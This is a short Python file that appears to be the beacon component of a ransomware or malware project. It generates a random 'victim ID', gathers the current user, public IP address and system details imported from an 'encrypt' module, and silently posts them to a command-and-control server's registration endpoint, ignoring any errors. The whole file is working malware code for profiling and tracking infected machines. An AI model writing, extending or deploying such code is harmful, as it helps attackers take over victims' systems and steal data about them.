import random
import string
import requests
from encrypt import current_user,public_ip,system_info

def generate_victimID():
 result = []
 for x in range(20):
  result.append((random.choice(string.ascii_letters + string.digits)))
 return "".join(result)
VICTIM_ID = generate_victimID()

#send victim id to c2 server (c2.py)

def send_to_c2():
 url = "http://127.0.0.1:5000/register"
 data = {"victim_ID" : VICTIM_ID,
         "current_user" : current_user,
         "public_ip" : public_ip,
         "system_info": system_info}
 try:
   requests.post(url, json=data)
 except:
  pass
 
send_to_c2()

